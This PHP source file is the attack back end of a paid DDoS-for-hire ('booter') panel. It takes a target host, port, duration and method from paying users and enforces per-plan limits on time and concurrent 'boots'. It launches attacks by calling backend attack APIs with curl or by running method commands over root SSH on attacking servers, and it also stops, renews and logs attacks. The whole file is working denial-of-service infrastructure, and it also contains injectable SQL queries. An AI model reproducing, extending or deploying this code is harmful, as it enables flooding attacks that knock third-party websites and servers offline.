<?php 
//Header
ob_start();
require_once '../@/config.php';
require_once '../@/init.php';
if (!empty($maintaince)) {
    die($maintaince);
}
if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !(isset($_GET['type'])) || !(isset($_SERVER['HTTP_REFERER']))) {
    die();
}
if (!($user->hasMembership($odb)) && $testboots == 0) {
    die();
}
$type     = $_GET['type'];
$username = $_SESSION['username'];

// TN
if ($type == 'all') {
        //Get, set and validate!
        $host   = $_GET['host'];
        $port   = intval($_GET['port']);
        $time   = intval($_GET['time']);
        $method = $_GET['method'];
        //Verifying all fields
        if (empty($host) || empty($time) || empty($port) || empty($method)) {
            die(error('Please verify all fields'));
        }
 

if ($method == "HTTP" || $method == "ADVANCED" || $method == "BOT18" || $method == "XML") {

}

else {
die(error('Sorry, but you can only use Layer 7 methods on VIP Panel including Minecraft Bot.'));
}


        
        //Check if the method is legit
        if (!ctype_alnum(str_replace(' ', '', $method))) {
            die(error('Method is unavailable'));
        }
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$countMethod = $SQL -> fetchColumn(0);
        if ($countMethod == 0) {
            die(error('Method is unavailable'));
        }
        

        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$type = $SQL -> fetchColumn(0);
        if ($type == 'layer7') {
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('You are not allowed to attack these kind of websites!');
                }
            }
        } 
 

$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$SQL -> execute(array(':username' => $username));
		$countRunning = $SQL -> fetchColumn(0);
        if ($countRunning > 0) {
            die(error('Sorry, you cant run more than 1 concurrent attack on VIP Panel.'));
        }



		if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$SQL -> execute(array(':username' => $username));
		$countRunning = $SQL -> fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('You have too many boots running.'));
        }
	}
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if ($time > $maxTime) {
        die(error('Your max boot time has been exceeded.'));
    }
    if ($system == 'api') {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
				'[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    //End of attacking servers script
    $handlers     = @implode(",", $handler);
    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $username,
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $handlers
    ));
    //Insert test attack
    echo success('Attack send to '.$host.':'.$port.'<br><br><strong>Handlers:</strong> ' .$handlers);
}

//Start attack function
if ($type == 'start' || $type == 'renew') {
    if ($type == 'start') {
        //Get, set and validate!
        $host   = $_GET['host'];
        $port   = intval($_GET['port']);
        $time   = intval($_GET['time']);
        $method = $_GET['method'];
        //Verifying all fields
        if (empty($host) || empty($time) || empty($port) || empty($method)) {
            die(error('Please verify all fields'));
        }
        //Check if the method is legit
        if (!ctype_alnum(str_replace(' ', '', $method))) {
            die(error('Method is unavailable'));
        }
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$countMethod = $SQL -> fetchColumn(0);
        if ($countMethod == 0) {
            die(error('Method is unavailable'));
        }


$SQL = $odb->prepare("SELECT membership FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$checkrank = $SQL -> fetchColumn(0);

if ($checkrank == "5") {

if ($method == "HTTP" || $method == "ADVANCED" || $method == "FREEDNS") {

}
else {
die(error('This method is not enabled for free users.'));
}
}
else {
}




        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$type = $SQL -> fetchColumn(0);
        if ($type == 'layer7') {
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('You are not allowed to attack these kind of websites!');
                }
            }
        } 
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host AND `type` = 'victim'");
		$SQL -> execute(array(':host' => $host));
		$countBlacklist = $SQL -> fetchColumn(0);
        if ($countBlacklist > 0) {
            die(error('Host is blacklisted'));
        }
    } else {
        $renew     = intval($_GET['id']);
        $SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
		$SQLSelect -> execute(array(':renew' => $renew));
        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $host   = $show['ip'];
            $port   = $show['port'];
            $time   = $show['time'];
            $method = $show['method'];
            $userr  = $show['user'];
        }
        if (!($userr == $username) && !$user->isAdmin($odb)) {
            die(error('This is not your attack'));
        }
    }
    //Check concurrent attacks
    if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$SQL -> execute(array(':username' => $username));
		$countRunning = $SQL -> fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('You have too many boots running.'));
        }
    }
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $maxTime = 60;
    }
    if ($time > $maxTime) {
        die(error('Your max boot time has been exceeded.'));
    }
    //Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //Check if test boot has been launched
    if (!($user->hasMembership($odb))) {
	$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
	if ($testboots == 1 && $testattack > 0) {
        die(error('You have already launched your test attack'));
		}
    }
    //Check if the system is API
    if ($system == 'api') {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
				'[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
        if ($i == 0) {
            die(error('There are no servers available to handle your attack, try later.'));
        }
    }
    //Use Attacking Servers
    else {
        //Check rotation
        $i                = 0;
        $SQLSelectServers = $odb->prepare("SELECT * FROM `servers` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectServers -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $SQL      = $odb->prepare("SELECT `command` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$command = $SQL -> fetchColumn(0);
            $arrayFind    = array(
                '{$host}',
                '{$port}',
                '{$time}',
				'{$method}'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $command      = str_replace($arrayFind, $arrayReplace, $command);
            $handler[]    = $show['name'];
            $ip           = $show['ip'];
            $password     = $show['password'];
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('Could not connect to a server. Please try again in a few minutes.'));
            }
            $ssh->exec($command . ' > /dev/null &');
            $i++;
        }
    }
    if ($i == 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //End of attacking servers script
    $handlers     = @implode(",", $handler);
    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $username,
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $handlers
    ));
    //Insert test attack
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
    }
    echo success('Attack send to '.$host.':'.$port.'<br><br><strong>Handler:</strong> ' .$handlers);
}














//Start PREMIUM FUNCTION
if ($type == 'premium'){
    if ($type == 'premium') {
        //Get, set and validate!
        $host   = $_GET['host'];
        $port   = intval($_GET['port']);
        $time   = intval($_GET['time']);
        $method = $_GET['method'];
        $handler = $_GET['handler'];
        $automatic = $_GET['automatic'];
        //die(error('AUTOMATIC: '. $automatic));
        //Verifying all fields
        if (empty($host) || empty($time) || empty($port) || empty($method)) {
            die(error('Please verify all fields'));
        }
        //Check if the method is legit
        if (!ctype_alnum(str_replace(' ', '', $method))) {
            die(error('Method is unavailable'));
        }
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$countMethod = $SQL -> fetchColumn(0);
        if ($countMethod == 0) {
            die(error('Method is unavailable'));
        }

//die(error('PREMIUM IN MAINTENANCE <BR><BR>HANDLER: '. $handler));


$SQL = $odb->prepare("SELECT membership FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$checkrank = $SQL -> fetchColumn(0);

//check handler id
$SQL = $odb->prepare("SELECT id FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$checkrank = $SQL -> fetchColumn(0);


        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
		$SQL -> execute(array(':method' => $method));
		$type = $SQL -> fetchColumn(0);
        if ($type == 'layer7') {
            die(error('Use VIP Panel in order to use Layer 7.'));

            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('You are not allowed to attack these kind of websites!');
                }
            }
        } 
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host AND `type` = 'victim'");
		$SQL -> execute(array(':host' => $host));
		$countBlacklist = $SQL -> fetchColumn(0);
        if ($countBlacklist > 0) {
            die(error('Host is blacklisted'));
        }
    } else {
        $renew     = intval($_GET['id']);
        $SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
		$SQLSelect -> execute(array(':renew' => $renew));
        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $host   = $show['ip'];
            $port   = $show['port'];
            $time   = $show['time'];
            $method = $show['method'];
            $userr  = $show['user'];
        }
        if (!($userr == $username) && !$user->isAdmin($odb)) {
            die(error('This is not your attack'));
        }
    }
    //Check concurrent attacks
    if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$SQL -> execute(array(':username' => $username));
		$countRunning = $SQL -> fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('You have too many boots running.'));
        }
    }
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $maxTime = 60;
    }
    if ($time > $maxTime) {
        die(error('Your max boot time has been exceeded.'));
    }
    //Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //Check if test boot has been launched
    if (!($user->hasMembership($odb))) {
	$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
	if ($testboots == 1 && $testattack > 0) {
        die(error('You have already launched your test attack'));
		}
    }
    //Check if the system is API
    if ($system == 'api') {
        //Check rotation
        $i            = 0;

        if ($automatic == "No") {
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `name` LIKE :handler AND `methods` LIKE :methods");
		$SQLSelectAPI -> execute(array(':handler' => "%$handler%", ':methods' => "%$method%"));
}
       else {

$SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));


}

        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
            //die(error('METHODS: '. $methods));

			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
                        //die(error('Handler: '. $name. '<br><br>SLOTS AVAILABLE (BETA): '. $count));
            if ($count >= $show['slots']) {
                continue;
            }
            $i++; 
            
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
				'[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $APILink      = $show['api'];
            $handler    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
        if ($i == 0) {
            die(error('The handler that you choose is full or dont support that method, try another handler.'));
        }
    }
    //Use Attacking Servers
    else {
        //Check rotation
        $i                = 0;
        $SQLSelectServers = $odb->prepare("SELECT * FROM `servers` WHERE `methods` LIKE :method ORDER BY RAND()");
		$SQLSelectServers -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $SQL      = $odb->prepare("SELECT `command` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$command = $SQL -> fetchColumn(0);
            $arrayFind    = array(
                '{$host}',
                '{$port}',
                '{$time}',
				'{$method}'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
				$method
            );
            $command      = str_replace($arrayFind, $arrayReplace, $command);
            $handler[]    = $show['name'];
            $ip           = $show['ip'];
            $password     = $show['password'];
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('Could not connect to a server. Please try again in a few minutes.'));
            }
            $ssh->exec($command . ' > /dev/null &');
            $i++;
        }
    }
    if ($i == 0) {
        die(error('There are no servers available to handle your attack, try later.'));
    }
    //End of attacking servers script
    $handlers     = @implode($handler);
    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $username,
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $handler
    ));
    //Insert test attack
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
    }
    echo success('Attack send to '.$host.':'.$port.'<br><br><strong>Handler:</strong> ' .$handler);
}











//Stop attack function
if ($type == 'stop') {
    $stop      = intval($_GET['id']);
    $method = $_GET['method'];


    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
		$command  = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
    }
	$handlers = explode(",", $handler);

if ($method == "HTTP" || $method == "ADVANCED" || $method == "XML") {
                 $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 0 WHERE `id` = '$stop'");
                 die(error('Sorry but you can only STOP Layer 4 attacks.'));
                 
         }


	foreach ($handlers as $handler)
	{
    if ($system == 'api') {
        $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time
            );
            $APILink      = $show['api'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $stopcommand  = "&method=STOP";
            $stopapi      = $APILink . $stopcommand;
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $stopapi);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
    } else {
        $SQLSelectServers = $odb->query("SELECT * FROM `servers` WHERE `name` = '$handler'");
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            $ip       = $show['ip'];
            $password = $show['password'];
            $command2 = 'pkill -f "'.$command.'"';
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('<strong>ERROR: </strong>Can not connect to an attacking server! Please try again in a few minutes.'));
            }
            $ssh->exec($command2.' > /dev/null &');
        }
    }
	}
    echo success('Attack Has Been Stopped!');
}


if ($type == 'attacks') {

			if (isset($_POST['ping']))
			{
			header('Location: ../index.php');
			}
			?>
             <table class="table table-striped">
			<tbody>
                  <tr>
				<th><center>Target</center></th>
				<th><center>Port</center></th>
				<th><center>Method</center></th>
				<th><center>Expires</center></th>
				<th><center>Action</center></th>
				
				<tr>
												
												</tr>
                  </tr>
<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `id` DESC LIMIT 5");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
		$dios    = htmlspecialchars($ip);
        $expires = $date + $time - time();
		if ($expires < 0 || $show['stopped'] != 0) {
            $countdown = "Expired";
        } else { 
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 attacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
      } 
        if ($show['time'] + $show['date'] > time() and $show['stopped'] != 1) {
            $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
																	<span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>  Stop
																	</button>';
        } else {
            $action = '
			<button type="button" id="rere" onclick="renew(' . $rowID . ')" class="btn btn-xs btn-effect-ripple btn-success">
																	<span class="btn-ripple animate"></span><i class="fa fa-refresh fa-spin"></i>   Renew
																	</button>';
        }
       	   ?>	   
		   
		   <tr>
			<td><center><?php echo $dios ?></center></td>
			<td><center><?php echo $port ?></center></td>
			<td><center><?php echo $method ?></center></td>
			<td><center><?php echo $countdown ?></center></td>
			<td><center><?php echo $action ?></center></td>
			
		   </tr>
   <?php
   }
?> 
              </tbody></table>
<?php 
}

if ($type == 'adminattacks' && $user -> isAdmin($odb)) {
?>
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th>User</th>
                    <th>Target</th>
                    <th>Method</th>
                    <th>Expires</th>
                    <th>Stop</th>
                  </tr>
                </thead>
                <tbody>
<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC LIMIT 20");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $user      = $show['user'];
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
        $expires = $date + $time - time();
        if ($expires < 0 || $show['stopped'] != 0) {
            $countdown = "Expired";
        } else {
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
	 adminattacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
        }
            $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st" class="btn btn-danger"><i class="fa fa-power-off"></i> Stop</button>';
        echo '<tr><td>'.$user.'</td><td>' . htmlspecialchars($ip) . ':'.$port.'</td><td>' . $method . '</td><td>' . $countdown . '</td><td>' . $action . '</td></tr>';
    }
?> 
				</tbody>
              </table>
<?php 
	if (empty($show)) {
	echo 'No running attacks';
	}
}
?>
